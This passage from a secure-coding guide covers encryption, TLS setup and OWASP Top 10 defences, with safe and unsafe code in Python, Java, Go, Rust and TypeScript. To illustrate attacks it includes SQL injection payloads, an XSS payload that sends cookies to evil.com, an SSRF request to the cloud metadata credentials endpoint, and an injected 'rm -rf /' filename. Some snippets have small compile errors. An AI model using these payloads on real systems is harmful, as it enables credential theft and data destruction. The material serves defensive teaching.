  const iv = crypto.getRandomValues(new Uint8Array(12)); // 96-bit IV
  const encoded = new TextEncoder().encode(plaintext);
  const ciphertext = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoded
  );
  const output = new Uint8Array(12 + ciphertext.byteLength);
  output.set(iv, 0);
  output.set(new Uint8Array(ciphertext), 12);
  return output;
}

async function decrypt(key: CryptoKey, payload: Uint8Array): Promise<string> {
  const iv         = payload.slice(0, 12);
  const ciphertext = payload.slice(12);
  const plaintext  = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    ciphertext
  );
  return new TextDecoder().decode(plaintext);
}
```

### 5.2 Envelope Encryption — The Production Pattern

In production, you never encrypt directly with a KMS master key. That would be expensive, slow, and would send all your data to the KMS service. Instead, use **envelope encryption**:

```
┌─────────────────────────────────────────────────────────┐
│              ENVELOPE ENCRYPTION PATTERN                │
│                                                         │
│  1. Generate a random Data Encryption Key (DEK)         │
│     DEK = crypto.randomBytes(32) // AES-256             │
│                                                         │
│  2. Encrypt your data with the DEK locally              │
│     ciphertext = AES-256-GCM(DEK, plaintext)            │
│                                                         │
│  3. Encrypt the DEK with your KMS Master Key            │
│     encryptedDEK = KMS.encrypt(masterKeyId, DEK)        │
│                                                         │
│  4. Store: encryptedDEK + ciphertext                    │
│     (store them together, e.g. in a database column)    │
│                                                         │
│  DECRYPTION:                                            │
│  1. DEK = KMS.decrypt(masterKeyId, encryptedDEK)        │
│  2. plaintext = AES-256-GCM.decrypt(DEK, ciphertext)    │
│                                                         │
│  WHY: KMS only sees the 32-byte DEK, not your data.     │
│       You can rotate master keys by re-encrypting DEKs. │
│       KMS call only needed at encrypt/decrypt time,     │
│       not for every read.                               │
└─────────────────────────────────────────────────────────┘
```

---

## Chapter 6: Asymmetric Cryptography

### 6.1 RSA — Correct Key Sizes and Padding

RSA is a public-key system: encrypt with public key, decrypt with private key (for confidentiality); sign with private key, verify with public key (for authentication).

**Key size requirements (2024):**
- 2048-bit: minimum acceptable, not recommended for new systems
- 3072-bit: recommended minimum for new systems
- 4096-bit: for long-lived keys and high-value data

**Critical: Never use PKCS#1 v1.5 padding for encryption.** It is vulnerable to the Bleichenbacher attack. Use **OAEP (Optimal Asymmetric Encryption Padding)** for encryption and **PSS (Probabilistic Signature Scheme)** for signatures.

```
PADDING          OPERATION        STATUS
─────────────────────────────────────────────────────
PKCS#1 v1.5      Encryption       ❌ Vulnerable (Bleichenbacher)
PKCS#1 v1.5      Signing          ⚠ Deprecated (use PSS instead)
OAEP with SHA-256 Encryption      ✅ Use this
PSS with SHA-256  Signing         ✅ Use this
```

### 6.2 ECC — Elliptic Curve Cryptography

ECC provides equivalent security to RSA with much smaller key sizes (256-bit ECC ≈ 3072-bit RSA in security). Faster, smaller, preferred for modern systems.

**Recommended curves:**
- **P-256 (prime256v1)**: NIST standard, widely supported, good for TLS and signing
- **Ed25519**: EdDSA — faster, less implementation risk, preferred for signing
- **X25519**: Diffie-Hellman key exchange, used in TLS 1.3

**Curves to avoid:**
- P-192, P-224: too small
- secp256k1 (Bitcoin's curve): fine cryptographically but NIST recommends P-256 for general use

```go
// Go — Ed25519 signing (preferred for signatures)
package crypto

import (
    "crypto/ed25519"
    "crypto/rand"
)

func GenerateSigningKeyPair() (ed25519.PublicKey, ed25519.PrivateKey, error) {
    return ed25519.GenerateKey(rand.Reader)
}

func Sign(privateKey ed25519.PrivateKey, message []byte) []byte {
    return ed25519.Sign(privateKey, message)
    // Ed25519 signatures are deterministic — no random needed, no bias risk
}

func Verify(publicKey ed25519.PublicKey, message, signature []byte) bool {
    return ed25519.Verify(publicKey, message, signature)
}
```

---

## Chapter 7: TLS — The Protocol Your Code Runs Over

### 7.1 TLS 1.3 — What Changed

TLS 1.3 (RFC 8446) made sweeping security improvements over TLS 1.2:

```
FEATURE                  TLS 1.2              TLS 1.3
──────────────────────────────────────────────────────────────────
Forward Secrecy          Optional             Mandatory (all key exchanges)
Cipher suites            100+ options         5 curated suites only
Round trips              2-RTT                1-RTT (0-RTT possible)
Handshake encryption     Partial              Full (cert hidden from passive observer)
Removed algorithms       RC4, 3DES,           RSA key exchange,
                         MD5 still possible   DH groups < 2048,
                                              all export ciphers
0-RTT resumption         N/A                  Available (replay risk, use carefully)
```

**Your code responsibilities for TLS:**
- Enforce minimum TLS 1.2, prefer TLS 1.3 only for new systems
- Disable TLS compression (CRIME attack)
- Set strong cipher suites
- Validate certificates properly — do not disable verification

```python
# Python — secure TLS configuration with requests and custom SSLContext
import ssl
import requests
from requests.adapters import HTTPAdapter

def create_secure_ssl_context() -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.set_ciphers(
        "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20"
        ":!aNULL:!MD5:!DSS:!RC4:!3DES"
    )
    ctx.verify_mode = ssl.CERT_REQUIRED  # Never ssl.CERT_NONE in production
    ctx.check_hostname = True
    ctx.load_verify_locations(cafile="/etc/ssl/certs/ca-certificates.crt")
    return ctx

# NEVER do this in production code:
# requests.get(url, verify=False)  # disables cert validation!
# ssl.CERT_NONE                    # disables cert validation!
```

```java
// Java — enforcing TLS 1.3 with strong cipher suites in Spring Boot
@Configuration
public class TlsConfig {
    @Bean
    public TomcatServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();
        factory.addConnectorCustomizers(connector -> {
            var http11 = (AbstractHttp11Protocol<?>) connector.getProtocolHandler();
            http11.setSSLEnabled(true);
            http11.setSslProtocol("TLSv1.3");
            // Only allow TLS 1.2 and 1.3
            http11.setProperty("jdk.tls.disabledAlgorithms",
                "SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize < 2048");
        });
        return factory;
    }
}
```

### 7.2 Mutual TLS (mTLS) for Service-to-Service

In microservices, TLS verifies the server's identity. mTLS additionally verifies the client's identity. Both sides present certificates. This is the foundation of zero-trust service meshes (Istio, Linkerd).

```
Standard TLS:
  Client ──── "I want to talk to api.example.com" ────► Server
  Client ◄─── "Here's my certificate (server cert)" ─── Server
  Client validates server cert against CA
  Encrypted channel established

Mutual TLS (mTLS):
  Client ──── "I want to talk to api.example.com" ────► Server
  Client ◄─── "Here's my certificate" ──────────────── Server
  Client validates server cert                         ↕
  Client ──── "Here's MY certificate" ────────────────► Server
  Server validates client cert against its trusted CA
  Only whitelisted client certificates can connect
```

---

# PART 3 — OWASP TOP 10: ATTACKS, CODE, AND DEFENSES

---

## Chapter 8: SQL Injection (A03:2021)

### 8.1 Theory

SQL injection occurs when user-supplied data is concatenated into SQL queries without proper sanitization, allowing attackers to modify the query's logic, extract data, or execute arbitrary commands.

**Severity**: Critical. Can lead to complete database compromise, authentication bypass, and data exfiltration.

### 8.2 Attack Anatomy

```sql
-- Target endpoint: GET /api/users?id=1
-- Vulnerable query built as:
SELECT * FROM users WHERE id = <user_input>

-- Attack: user_input = "1 OR 1=1"
SELECT * FROM users WHERE id = 1 OR 1=1
-- Returns ALL users

-- Attack: user_input = "1; DROP TABLE users;--"
SELECT * FROM users WHERE id = 1; DROP TABLE users;--
-- Deletes the table (if multi-statement execution allowed)

-- Attack: user_input = "1 UNION SELECT username, password, null FROM admin_users--"
-- Returns admin credentials in same response
```

### 8.3 Defenses — In All Five Languages

**Defense 1: Parameterized Queries / Prepared Statements** (primary, always)

```python
# Python — UNSAFE (never do this)
def get_user_bad(user_id: str):
    cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")  # INJECTABLE

# Python — SAFE: parameterized query
def get_user_safe_raw(user_id: int, conn):
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()

# Python — SAFE: SQLAlchemy ORM (parameterized under the hood)
from sqlalchemy import select
from sqlalchemy.orm import Session

def get_user_orm(user_id: int, session: Session):
    return session.execute(
        select(User).where(User.id == user_id)
    ).scalar_one_or_none()

# Python — SAFE: SQLAlchemy Core with text() (when raw SQL needed)
from sqlalchemy import text

def search_users(email: str, session: Session):
    result = session.execute(
        text("SELECT id, email FROM users WHERE email = :email"),
        {"email": email}  # Parameter binding, not string formatting
    )
    return result.fetchall()
```

```java
// Java — UNSAFE
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(
    "SELECT * FROM users WHERE id = " + userId); // INJECTABLE

// Java — SAFE: PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT id, email, role FROM users WHERE id = ?");
ps.setInt(1, userId); // Type-safe parameter binding
ResultSet rs = ps.executeQuery();

// Java — SAFE: JPA/Hibernate with JPQL
// Named parameter prevents injection; Hibernate handles escaping
TypedQuery<User> query = entityManager.createQuery(
    "SELECT u FROM User u WHERE u.email = :email", User.class);
query.setParameter("email", email);
return query.getSingleResult();

// Java — SAFE: Spring Data JPA Repository
// Framework generates parameterized query automatically
public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.email = :email AND u.active = true")
    Optional<User> findActiveByEmail(@Param("email") String email);
    
    // Even simpler - Spring Data derives safe query from method name:
    Optional<User> findByEmailAndActiveTrue(String email);
}
```

```go
// Go — UNSAFE
query := fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email) // INJECTABLE
rows, _ := db.Query(query)

// Go — SAFE: database/sql with placeholder
rows, err := db.QueryContext(ctx,
    "SELECT id, email, role FROM users WHERE email = $1", // PostgreSQL
    email)

// Go — SAFE: sqlx (named parameters)
var user User
err = sqlx.GetContext(ctx, db, &user,
    "SELECT id, email, role FROM users WHERE id = :id AND active = true",
    map[string]interface{}{"id": userID})

// Go — SAFE: GORM
var user User
result := db.Where("email = ? AND active = ?", email, true).First(&user)
```

```rust
// Rust — SAFE: sqlx with compile-time checked queries
use sqlx::PgPool;

async fn get_user(pool: &PgPool, email: &str) -> Result<User, sqlx::Error> {
    // sqlx::query_as! macro checks SQL at compile time against the DB schema
    sqlx::query_as!(
        User,
        "SELECT id, email, role FROM users WHERE email = $1 AND active = true",
        email  // $1 is a positional parameter — no string interpolation possible
    )
    .fetch_optional(pool)
    .await?
    .ok_or(sqlx::Error::RowNotFound)
}
// Rust's type system + sqlx's compile-time checks make SQLi nearly impossible
```

```typescript
// TypeScript — UNSAFE (Prisma won't let you do this easily, but raw SQL is possible)
const result = await prisma.$queryRawUnsafe(
    `SELECT * FROM users WHERE email = '${email}'`); // INJECTABLE

// TypeScript — SAFE: Prisma ORM (parameterized by default)
const user = await prisma.user.findFirst({
    where: { email: email, active: true },
    select: { id: true, email: true, role: true } // explicit projection
});

// TypeScript — SAFE: Prisma raw query with parameters
const users = await prisma.$queryRaw`
    SELECT id, email FROM users WHERE email = ${email}
`; // Template literal syntax automatically parameterizes

// TypeScript — SAFE: Drizzle ORM
import { eq, and } from 'drizzle-orm';
const user = await db.select()
    .from(usersTable)
    .where(and(eq(usersTable.email, email), eq(usersTable.active, true)))
    .limit(1);
```

**Defense 2: Input validation** (additional layer)
```python
from pydantic import BaseModel, validator
import re

class UserSearchRequest(BaseModel):
    email: str

    @validator("email")
    def validate_email(cls, v):
        if not re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', v):
            raise ValueError("Invalid email format")
        if len(v) > 254:
            raise ValueError("Email too long")
        return v.lower().strip()
```

**Defense 3: Least-privilege database accounts**
```sql
-- Create a restricted application user with only needed permissions
CREATE USER app_user WITH PASSWORD 'strong_random_password';
GRANT SELECT, INSERT, UPDATE ON TABLE users TO app_user;
GRANT SELECT ON TABLE products TO app_user;
-- No DROP, no TRUNCATE, no access to system tables
-- Even if SQLi occurs, attacker cannot escalate to DDL operations
```

---

## Chapter 9: Cross-Site Scripting — XSS (A03:2021)

### 9.1 Theory

XSS injects malicious scripts into web pages viewed by other users. The script runs in the victim's browser with full access to the DOM, cookies, and session storage.

**Three types:**
- **Reflected XSS**: Payload in the request, reflected immediately in the response
- **Stored XSS**: Payload stored in the database, served to every visitor (most dangerous)
- **DOM XSS**: Payload processed by client-side JavaScript without hitting the server

### 9.2 Attack Anatomy

```
STORED XSS ATTACK FLOW:

Attacker ──► POST /api/comments ─────────► Database
             { "text": "<script>         (payload stored)
               document.location=
               'https://evil.com/steal?c='
               +document.cookie
               </script>" }

Victim ──► GET /api/comments ────────────► Server
           Authorization: Bearer <token>   returns stored script

Browser ──► Renders response ─────────────► Executes <script>
            victim's cookie/session sent    to attacker's server
```

### 9.3 Defenses

**Output encoding is the primary defense.** Encode data before inserting it into HTML context.

```
CONTEXT                     ENCODING NEEDED
──────────────────────────────────────────────────────────────────
HTML body content           HTML entity encode: & " ' < > /
HTML attribute values       HTML attribute encode
JavaScript string           JavaScript escape
URL parameter value         URL percent encode
CSS value                   CSS escape
```

```typescript
// TypeScript / React — SAFE: React auto-escapes in JSX
function Comment({ text }: { text: string }) {
    return <p>{text}</p>; // text is auto-escaped; '<script>' becomes '&lt;script&gt;'
}

// UNSAFE: dangerouslySetInnerHTML bypasses React's escaping
function DangerousComment({ html }: { html: string }) {
    return <p dangerouslySetInnerHTML={{ __html: html }} />; // ONLY if sanitized!
}

// If you MUST render HTML (rich text editor output), sanitize first:
import DOMPurify from 'dompurify';

function SafeRichText({ html }: { html: string }) {
    const sanitized = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'u', 'p', 'br', 'a'],
        ALLOWED_ATTR: ['href', 'target'],
        FORBID_SCRIPTS: true,
    });
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

```python
# Python — Jinja2 templates auto-escape HTML by default
# SAFE (default):
template = Template("<p>{{ user_input }}</p>")
# user_input = "<script>alert(1)</script>"
# Output: <p>&lt;script&gt;alert(1)&lt;/script&gt;</p>

# UNSAFE — | safe filter disables escaping (only for trusted content):
# <p>{{ user_input | safe }}</p>  ← XSS if user_input is untrusted

# For JSON context (prevent JSON injection):
import json
safe_json = json.dumps(user_data)
# Embed in HTML: <script>var data = {{ safe_json | tojson }};</script>
# Jinja2's tojson filter properly escapes for JS context
```

```java
// Java — Spring/Thymeleaf auto-escapes by default
// SAFE:
<p th:text="${userInput}">Default</p>  <!-- auto-escaped -->

// UNSAFE:
<p th:utext="${userInput}">Default</p>  <!-- unescaped HTML! -->

// For REST APIs returning JSON — set Content-Type correctly:
@RestController
public class CommentController {
    @GetMapping(value = "/comments", produces = MediaType.APPLICATION_JSON_VALUE)
    public List<CommentDto> getComments() {
        // application/json content-type tells browsers not to render as HTML
        return commentService.findAll();
    }
}
```

**Content Security Policy (CSP) — the defense-in-depth layer:**

```
# STRONG CSP header
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{random-nonce}';  # Only scripts from same origin + nonce
  style-src 'self' 'unsafe-inline';           # Allow inline CSS (weaker)
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';                     # Prevents clickjacking
  form-action 'self';
  base-uri 'self';
  upgrade-insecure-requests;

# Nonce-based approach (prevents 'unsafe-inline'):
# Server generates fresh nonce per request:
import secrets
csp_nonce = secrets.token_urlsafe(16)
# <script nonce="{{csp_nonce}}">...</script>
```

---

## Chapter 10: Server-Side Request Forgery — SSRF (A10:2021)

### 10.1 Theory

SSRF allows an attacker to make the server issue HTTP requests to arbitrary destinations, including internal services, cloud metadata endpoints, and localhost.

**Why SSRF is critical in cloud environments:**
The AWS instance metadata service at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns temporary IAM credentials for the EC2 instance's role. A single SSRF vulnerability can lead to complete AWS account compromise.

### 10.2 Attack Anatomy

```
Attack Flow:
  POST /api/preview-url
  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

  Server fetches the URL (internally)
  Returns: {
    "Code": "Success",
    "AccessKeyId": "ASIA...",     ← AWS credentials
    "SecretAccessKey": "...",
    "Token": "..."
  }

  Attacker uses these credentials to access all AWS resources the EC2 role can reach.
```

### 10.3 Defenses

```python
# Python — SSRF-safe URL fetching with allowlist
import ipaddress
import socket
from urllib.parse import urlparse
import httpx

ALLOWED_SCHEMES   = {"https"}
ALLOWED_DOMAINS   = {"api.partner.com", "webhooks.stripe.com"}
BLOCKED_IP_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),       # RFC 1918 private
    ipaddress.ip_network("172.16.0.0/12"),     # RFC 1918 private
    ipaddress.ip_network("192.168.0.0/16"),    # RFC 1918 private
    ipaddress.ip_network("169.254.0.0/16"),    # Link-local (metadata service!)
    ipaddress.ip_network("127.0.0.0/8"),       # Loopback
    ipaddress.ip_network("::1/128"),           # IPv6 loopback
    ipaddress.ip_network("fc00::/7"),          # IPv6 unique local
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # Check domain allowlist
    hostname = parsed.hostname
    if hostname not in ALLOWED_DOMAINS:
        return False

    # Resolve DNS and check resulting IP (prevents DNS rebinding)
    try:
        resolved_ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    except (socket.gaierror, ValueError):
        return False

    for blocked_range in BLOCKED_IP_RANGES:
        if resolved_ip in blocked_range:
            return False  # Internal IP — likely SSRF attempt

    return True

async def safe_fetch(url: str) -> httpx.Response:
    if not is_safe_url(url):
        raise ValueError(f"URL not allowed: {url}")
    async with httpx.AsyncClient(
        timeout=10,                        # Prevent slowloris-style hangs
        follow_redirects=False,            # Don't follow redirects (DNS rebinding risk)
        max_redirects=0,
    ) as client:
        return await client.get(url)
```

```go
// Go — SSRF mitigation with custom http.Transport
package security

import (
    "context"
    "fmt"
    "net"
    "net/http"
    "net/url"
)

var blockedCIDRs = []net.IPNet{
    mustParseCIDR("10.0.0.0/8"),
    mustParseCIDR("172.16.0.0/12"),
    mustParseCIDR("192.168.0.0/16"),
    mustParseCIDR("169.254.0.0/16"), // AWS metadata
    mustParseCIDR("127.0.0.0/8"),
}

func NewSSRFSafeClient() *http.Client {
    dialer := &net.Dialer{}
    transport := &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            host, _, err := net.SplitHostPort(addr)
            if err != nil { return nil, err }

            ips, err := net.LookupHost(host)
            if err != nil { return nil, err }

            for _, ipStr := range ips {
                ip := net.ParseIP(ipStr)
                for _, blocked := range blockedCIDRs {
                    if blocked.Contains(ip) {
                        return nil, fmt.Errorf("blocked: %s resolves to private IP %s", host, ipStr)
                    }
                }
            }
            return dialer.DialContext(ctx, network, addr)
        },
    }
    return &http.Client{
        Transport:     transport,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Don't follow redirects
        },
        Timeout: 10 * time.Second,
    }
}
```

---

## Chapter 11: Insecure Direct Object Reference (IDOR) — Authorization Failures

### 11.1 Theory

IDOR (now classified under A01:2021 Broken Access Control) occurs when an application uses user-supplied input to access objects directly without authorization checks. The attacker simply changes an ID and accesses another user's data.

### 11.2 Attack Anatomy

```
GET /api/invoices/12345       ← My invoice
GET /api/invoices/12346       ← Someone else's invoice; no authorization check!
GET /api/invoices/1           ← First invoice ever created — could be yours or anyone's
```

### 11.3 Defenses

```python
# WRONG: Fetch by ID without ownership check
@app.get("/api/invoices/{invoice_id}")
async def get_invoice_unsafe(invoice_id: int, db: Session = Depends(get_db)):
    return db.query(Invoice).filter(Invoice.id == invoice_id).first()
    # Any authenticated user can retrieve any invoice by changing the ID

# CORRECT: Scope query to the authenticated user's resources
@app.get("/api/invoices/{invoice_id}")
async def get_invoice_safe(
    invoice_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    invoice = db.query(Invoice).filter(
        Invoice.id == invoice_id,
        Invoice.user_id == current_user.id  # Ownership check in the query
    ).first()
    if not invoice:
        raise HTTPException(404)  # Use 404, not 403: don't reveal the resource exists
    return invoice

# DEFENSE IN DEPTH: Use UUIDs instead of sequential integers
# Sequential IDs (1, 2, 3...) are enumerable — attackers can walk them
# UUIDs (550e8400-e29b-41d4-a716-446655440000) are not enumerable
import uuid
class Invoice(Base):
    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    user_id = Column(Integer, ForeignKey('users.id'), nullable=False)
    # UUIDs don't replace authz checks but make enumeration attacks impractical
```

```java
// Java — Spring Security with method-level authorization
@Service
public class InvoiceService {

    // @PostAuthorize verifies owner AFTER fetching — use for resource owner check
    @PostAuthorize("returnObject.userId == authentication.principal.id")
    public Invoice getInvoice(UUID invoiceId) {
        return invoiceRepo.findById(invoiceId)
            .orElseThrow(() -> new ResourceNotFoundException("Invoice not found"));
    }

    // Better: Scope the query, don't fetch then authorize
    public Invoice getInvoiceForUser(UUID invoiceId, UUID userId) {
        return invoiceRepo.findByIdAndUserId(invoiceId, userId)
            .orElseThrow(() -> new ResourceNotFoundException("Invoice not found"));
        // 404 reveals nothing — cannot distinguish "no access" from "doesn't exist"
    }

    // Admin endpoint with explicit role check
    @PreAuthorize("hasRole('ADMIN')")
    public List<Invoice> getAllInvoices() {
        return invoiceRepo.findAll();
    }
}
```

---

## Chapter 12: Command Injection (A03:2021)

### 12.1 Theory

Command injection occurs when user input is passed to a shell command, allowing attackers to execute arbitrary OS commands on the server.

### 12.2 Attack and Defense

```python
# UNSAFE — Python os.system / subprocess with shell=True
import os

# CRITICAL VULNERABILITY:
def resize_image_unsafe(filename: str):
    os.system(f"convert {filename} -resize 800x600 output.jpg")
    # Attack: filename = "image.jpg; rm -rf / #"
    # Executed: convert image.jpg; rm -rf / # -resize 800x600 output.jpg

# SAFE — Never use shell=True with user input; use argument list
import subprocess
import shlex

def resize_image_safe(filename: str, output: str):
    # Validate input first
    if not re.match(r'^[a-zA-Z0-9_\-]+\.[a-zA-Z]{3,4}$', filename):
        raise ValueError("Invalid filename")

    # Pass as list — no shell interpretation; each element is one argument
    subprocess.run(
        ["convert", filename, "-resize", "800x600", output],
        check=True,
        timeout=30,
        capture_output=True,
        # No shell=True — critical!
    )
```

```go
// Go — exec.Command takes args separately, no shell by default
import "os/exec"

// SAFE: Arguments are separate, never shell-interpreted
func ResizeImage(filename, output string) error {
    cmd := exec.Command("convert", filename, "-resize", "800x600", output)
    // exec.Command does NOT use a shell — args are passed directly to the OS
    return cmd.Run()
}

// UNSAFE: Using exec.Command("sh", "-c", ...) re-introduces injection risk
// NEVER DO:
// cmd := exec.Command("sh", "-c", "convert " + userInput)
```

---

# PART 4 — SECURE CODING BY LANGUAGE

---

## Chapter 13: Java Security

### 13.1 Spring Security — Production Configuration

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true)
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(
            HttpSecurity http,
            JwtAuthFilter jwtAuthFilter) throws Exception {
        return http
            // Disable CSRF for stateless JWT APIs (re-enable for session-based apps)
            .csrf(csrf -> csrf.disable())

            // CORS configuration
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // Session management — stateless for JWT
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // Security headers
            .headers(headers -> headers
                .frameOptions(FrameOptionsConfig::deny)          // Clickjacking
                .xssProtection(XssProtectionConfig::disable)     // Deprecated; use CSP
                .contentTypeOptions(ContentTypeOptionsConfig::and) // MIME sniffing
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true)
                    .preload(true))
                .cacheControl(CacheControlConfig::and)            // No sensitive data in cache
            )

            // Authorization rules — most restrictive first
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/health", "/actuator/health").permitAll()
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.GET, "/api/products/**").authenticated()
                .anyRequest().authenticated()
            )

            // JWT filter runs before UsernamePasswordAuthenticationFilter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)

            // Exception handling
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, e) ->
                    res.sendError(HttpServletResponse.SC_UNAUTHORIZED))
                .accessDeniedHandler((req, res, e) ->
                    res.sendError(HttpServletResponse.SC_FORBIDDEN))
            )
            .build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        var config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://app.example.com")); // Not "*"
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        var source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

### 13.2 Java Deserialization — A Critical Vulnerability

Java's native serialization is a persistent source of critical vulnerabilities (Apache Commons Collections, Spring Framework RCE chains).

```java
// CRITICAL: Never deserialize untrusted data with native Java serialization
// This can lead to Remote Code Execution

// UNSAFE:
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // ARBITRARY CODE EXECUTION if input is malicious

// SAFE ALTERNATIVES:
// 1. Use JSON (Jackson, Gson) instead of Java serialization
ObjectMapper mapper = new ObjectMapper();
mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
// Disable polymorphic deserialization unless needed:
// mapper.enableDefaultTyping() ← DANGEROUS; enables gadget chains
User user = mapper.readValue(json, User.class);

// 2. If you must use ObjectInputStream, implement a whitelist filter:
ObjectInputStream safeStream = new ObjectInputStream(inputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws ClassNotFoundException {
        Set<String> allowedClasses = Set.of(
            "com.example.model.SafeClass",
            "java.lang.String",
            "java.lang.Integer"
        );
        if (!allowedClasses.contains(desc.getName())) {
            throw new InvalidClassException("Blocked class: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
};
```

### 13.3 Java Security Headers Middleware

```java
@Component
@Order(Ordered.HIGHEST_PRECEDENCE)
public class SecurityHeadersFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        HttpServletResponse res = (HttpServletResponse) response;

        // Prevent MIME type sniffing
        res.setHeader("X-Content-Type-Options", "nosniff");

        // Prevent clickjacking
        res.setHeader("X-Frame-Options", "DENY");

        // HSTS — browser-side enforcement of HTTPS
        res.setHeader("Strict-Transport-Security",
            "max-age=31536000; includeSubDomains; preload");

        // Remove server fingerprinting
        res.setHeader("Server", "");
        res.setHeader("X-Powered-By", "");

        // Referrer Policy
        res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

        // Permissions Policy
        res.setHeader("Permissions-Policy",
            "geolocation=(), microphone=(), camera=(), payment=()");

        chain.doFilter(request, response);
    }
}
```

---

## Chapter 14: Python Security

### 14.1 FastAPI — Production Security Configuration

```python
from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware
import time

app = FastAPI(
    # Disable OpenAPI docs in production (leaks API structure)
    docs_url=None if os.getenv("ENV") == "production" else "/docs",
    redoc_url=None,
)

# HTTPS redirect in production
if os.getenv("ENV") == "production":
    app.add_middleware(HTTPSRedirectMiddleware)

# Trusted hosts — prevent host header injection
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["api.example.com", "localhost"]
)

# CORS — restrictive by default
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],  # Never "*" with credentials
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=3600,
)

# Security headers middleware
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"]    = "nosniff"
    response.headers["X-Frame-Options"]            = "DENY"
    response.headers["X-XSS-Protection"]           = "0"  # Deprecated; CSP is better
    response.headers["Strict-Transport-Security"]  = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"]             = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"]          = "geolocation=(), microphone=()"
    # Remove server fingerprinting
    response.headers.pop("server", None)
    return response

# Rate limiting with slowapi
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address, default_limits=["100/minute"])
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/auth/login")
@limiter.limit("5/minute")  # Strict rate limit on auth endpoints
async def login(request: Request, credentials: LoginRequest):
    ...
```

### 14.2 Python — Preventing Common Pitfalls

```python
# ─── Pickle Deserialization (Critical: RCE risk) ───────────────────────────
import pickle, os

# UNSAFE: pickle.loads on untrusted data = arbitrary code execution
# This will execute: os.system("rm -rf /")
malicious = b'\x80\x04\x95...'  # crafted pickle payload
data = pickle.loads(malicious)  # CRITICAL VULNERABILITY

# SAFE: Use JSON for data serialization
import json
data = json.loads(json_string)

# If you must use pickle (internal use only, never user data):
import hmac, hashlib
def safe_pickle_loads(data: bytes, key: bytes) -> object:
    """Only unpickle if HMAC signature matches (proves data came from your server)"""
    signature = data[-32:]
    payload   = data[:-32]
    expected  = hmac.new(key, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    return pickle.loads(payload)

